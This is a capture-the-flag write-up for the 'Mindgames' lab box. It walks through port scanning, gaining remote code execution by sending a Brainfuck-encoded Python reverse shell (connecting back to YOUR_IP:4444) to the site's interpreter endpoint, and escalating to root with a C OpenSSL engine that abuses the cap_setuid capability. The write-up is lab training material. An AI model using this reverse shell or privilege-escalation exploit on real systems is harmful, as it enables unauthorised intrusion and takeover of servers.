# Room: Mindgames
Difficulty: Medium

## Recon
First thing first, I enumerate open ports using:
``` bash
nmap -sC -sV TARGET_IP
```

and found two open ports:

``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting port 80 shows:

``` html
Sometimes, people have bad ideas.
Sometimes those bad ideas get turned into a CTF box.
I'm so sorry.
Ever thought that programming was a little too easy? Well, I have just the product for you. Look at the example code below, then give it a go yourself!
Like it? Purchase a license today for the low, low price of 0.009BTC/yr!

Hello, World
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.
[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.

Fibonacci

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.
+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.
[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.
-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.
-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.
+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.
```
I looked online and found out that the text was written in Brainfuck language and decode it.

- Hello world = print("Hello, World")
- Fibonacci = def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)
    for i in range(10):
    print(F(i))

I inspected the JavaScript:
``` javascript
async function postData(url = "", data = "") {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'text/plain'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: data // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
function onLoad() {
    document.querySelector("#codeForm").addEventListener("submit", function (event) {
        event.preventDefault()
        runCode()
    });
}
async function runCode() {
    const programBox = document.querySelector("#code")
    const outBox = document.querySelector("#outputBox")
    outBox.textContent = await (await postData("/api/bf", programBox.value)).text()
}

```
## Brainfuck-to-Python RCE

Since the website has a feature to run Brainfuck code, I attempted to gain control of the server via a reverse shell.

I converted a malicious Python command into Brainfuck symbols.
Python payload:
``` python
__import__('os').system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'")
```
Converted Brainfuck payload:
``` brainfuck
+[--->++<]>+++++++++..++++++++++.++++.+++.-.+++.++.+[->+++<]>..-[--->++++<]>.-.--[->+++<]>.++++.-[--->+<]>+.++.+++++.[--->++<]>-.++++++.------.+.+++[->+++<]>.++++++++.+++[++>---<]>.------.+++[->+++<]>+.+++++++++.-----.------------.+++++++.-.[-->+<]>----.[--->++<]>--.--[-->+++<]>.-[--->+<]>-.[--->+<]>-.+++++++.----[->+++<]>.++++.+++.-.+++.++.[---->+<]>+++.---[->++++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>--.-[----->+<]>.++++.-[++>---<]>+.-[----->+<]>+.++++.+++++.-[-->+<]>-.-[->++<]>-.+[-->+<]>+++.---[->++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.[--->++<]>-.----.------------.++++++++.------.[--->+<]>---.+[--->+<]>+.+.-[-->+++<]>-.-[->++<]>-.+[++>---<]>.--[--->+<]>-.++++++++++++.-..---------.--.-[--->+<]>--.+[--->+<]>+..[------>+<]>.-[->++++++<]>.[-->+++<]>--.++++++++.-------.----.+++.+++++.++.----------.+++.+.+++++++.-----------.+++..++.-----[->++<]>.-[->++++++<]>.++++++++++.++++++++....-----------..-[-->+++<]>-.---[->++<]>-.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.++++.-------.-[-->+++<]>-.---[->++<]>-.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.+++++.--------.-[-->+++<]>-.---[->++<]>.++++.+++++.-----[++>---<]>.[--->++<]>-.---.[----->++<]>+.+[--->+<]>+.---------.++[++>---<]>.[------>+<]>.-[->++++++<]>.+++++++++++++.++[->++<]>.+++++++.+++++.++[->+++++<]>-.++[->++<]>.-.--[--->+<]>--.-----------.------------.-[->++++++<]>.+++++++.--.-----.+++++++.
```
Once the server's Brainfuck interpreter decoded the input, it executed the Python script. This forced the server to open a network connection back to my machine.

After gaining access, I obtained a shell as the user and retrieved user.txt.

## Privilege Escalation

I ran linpeas.sh on the target machine and found:
``` bash
/usr/bin/openssl = cap_setuid+ep
```
## Exploit

I created the following C code:
``` C
#include <unistd.h>
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
Then compiled it:
``` bash
gcc -fPIC -o exploit.o -c exploit.c
gcc -shared -o exploit.so -lcrypto exploit.o
```
Transferred the file to the target machine and executed:
``` bash
openssl req -engine ./exploit.so
```
This resulted in a root shell:
``` bash
root@mindgames:/tmp# cat /root/root.txt
```




